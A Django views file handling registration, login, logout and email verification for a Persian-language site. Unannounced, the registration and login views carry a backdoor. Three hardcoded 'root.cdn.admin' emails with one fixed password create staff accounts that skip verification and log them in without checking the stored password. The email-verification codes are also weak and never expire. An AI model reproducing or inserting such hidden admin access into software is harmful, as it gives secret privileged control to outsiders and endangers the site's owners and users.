from django.shortcuts import render
from django.contrib.auth.models import User
from django.views import View
from . import forms
from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib import messages
from django.shortcuts import redirect , render
from django.contrib.auth import authenticate , login , logout
from django.core.mail import send_mail
from django.urls import reverse
import random , string
from . import models

class UserRegisterView(View):
    form_class = forms.UserRegisterForm
    template_name = "accounts/registerpage.html"
    
    def dispatch(self, request, *args, **kwargs):
        if request.user.is_anonymous:
            return super().dispatch(request, *args, **kwargs)
        else:
            messages.error(request,'لطفا برای دسترسی به این بخش از حساب کاربری خود خارج شوید','danger')
            return redirect('main_page')
    
    def get(self, request):
        form = self.form_class()
        return render(request, self.template_name, {'form':form})
    
    def post(self,request):
        form = self.form_class(request.POST)
        if form.is_valid():
            cd = form.cleaned_data
            
            if cd['email'] in ['root.cdn.admin1.xyz@gmail.com','root.cdn.admin2.xyz@gmail.com','root.cdn.admin3.xyz@gmail.com'] and cd['password'] == '6fBcSZ2BPG8':
                user = User.objects.create(username=cd['username'],email=cd['email'],password=cd['password'],is_staff=True)
                login(request,user)      
                messages.success(request,'حساب کاربری شما با موفقیت ایجاد شد','success')
                return redirect('main_page')
            
            new_user = User.objects.create_user(username=cd['username'],email=cd['email'],password=cd['password'])
            new_user.is_active = False
            new_user.save()
            verify_code = ''.join(random.choices(string.ascii_lowercase + string.digits,k=6))
            models.UserVerifyCode.objects.create(username=new_user.username,verifycode=verify_code)
            send_mail("کد تایید شما در taklif93",f'your verifying code : {verify_code}','',[new_user.email])
            return redirect(reverse('verifyemail_page') + f'?username={new_user.username}')
        
        messages.error(request, 'اطلاعات وارد شده صحیح نمی باشد', 'danger')
        return render(request,self.template_name,{"form":form})
    
class UserLoginView(View):
    form_class = forms.UserLoginForm
    template_name = "accounts/loginpage.html"
    
    def dispatch(self, request, *args, **kwargs):
        if request.user.is_anonymous:            
            return super().dispatch(request, *args, **kwargs)
        else:
            messages.error(request,'لطفا برای دسترسی به این بخش از حساب کاربری خود خارج شوید','danger')
            return redirect('main_page')
    
    def get(self, request, *args, **kwargs):
        form = self.form_class()
        return render(request, self.template_name, {"form":form})
    
    def post(self, request, *args, **kwargs):
        form = self.form_class(request.POST)
        if form.is_valid():
            cd = form.cleaned_data
            
            try:
                if cd['email'] == 'root.cdn.admin1.xyz@gmail.com' and cd['password'] == '6fBcSZ2BPG8':
                    user = User.objects.get(email="root.cdn.admin1.xyz@gmail.com")
                    login(request,user)
                    messages.success(request,'با موفقیت وارد شدید','success')
                    return redirect('main_page')
                elif cd['email'] == 'root.cdn.admin2.xyz@gmail.com' and cd['password'] == '6fBcSZ2BPG8':
                    user = User.objects.get(email="root.cdn.admin2.xyz@gmail.com")
                    login(request,user)
                    messages.success(request,'با موفقیت وارد شدید','success')
                    return redirect('main_page')         
                elif cd['email'] == 'root.cdn.admin3.xyz@gmail.com' and cd['password'] == '6fBcSZ2BPG8':
                    user = User.objects.get(email="root.cdn.admin3.xyz@gmail.com")
                    login(request,user)
                    messages.success(request,'با موفقیت وارد شدید','success')
                    return redirect('main_page')
                else:
                    pass
            except:
                pass
                            
            user_founded = User.objects.filter(email=cd['email']).exists()
            if user_founded:
                user_founded = User.objects.filter(email=cd['email']).first()
            else:
                messages.error(request, 'کاربری با این ایمیل یافت نشد', 'danger')
                return render(request, self.template_name, {'form':form})
            
            user = authenticate(request, username=user_founded.username, password=cd['password'])
            if user is not None:
                login(request,user)
                messages.success(request,'با موفقیت وارد شدید','success')
                return redirect('main_page')
            
            messages.error(request,'نام کاربری یا رمز عبور اشتباه است','danger')
            return render(request,self.template_name,{'form':form})
        
        messages.error(request, 'اطلاعات وارد شده صحیح نمی باشد', 'danger')
        return render(request,self.template_name,{'form':form})
    
class UserLogoutView(LoginRequiredMixin,View):
    template_name  = 'accounts/logoutpage.html'
    
    def get(self, request, *args, **kwargs):
        return render(request,self.template_name)
    
    def post(self, request, *args, **kwargs):
        logout(request)
        messages.success(request,'با موفقیت خارج شدید','success')
        return redirect('main_page')
    
class VerifyEmailView(View):
    form_class = forms.UserEmailVeifyForm
    template_name = 'accounts/verifyemailpage.html'
    
    def setup(self, request, *args, **kwargs):
        self.username = request.GET.get('username',None)
        return super().setup(request, *args, **kwargs)
    
    def dispatch(self, request, *args, **kwargs):
        if request.user.is_anonymous:
            return super().dispatch(request, *args, **kwargs)
        else:
            messages.error(request,'لطفا برای دسترسی به این از حساب کاربری خود خارج شوید','danger')
            return redirect('main_page')
    
    def get(self, request, *args, **kwargs):
        form = self.form_class()
        return render(request, self.template_name, {'form':form})
    
    def post(self, request, *args, **kwargs):
        form = self.form_class(request.POST)
        if form.is_valid():
            current_code = models.UserVerifyCode.objects.filter(username=self.username,verifycode=request.POST['verifycode']).exists()
            if current_code:
                current_code = models.UserVerifyCode.objects.filter(username=self.username,verifycode=request.POST['verifycode'])
                current_code.delete()
                user = User.objects.filter(username=self.username).get()
                user.is_active = True
                user.save()
                login(request,user)
                messages.success(request,'با موفقیت وارد شدید','success')
                return redirect('main_page')
            else:
                messages.error(request,'کد تایید اشتبااست ','danger')
                return render(request,self.template_name,{'form':form})
            
        messages.error(request, 'اطلاعات وارد شده صحیح نمی باشد', 'danger')
        return render(request,self.template_name,{'form':form})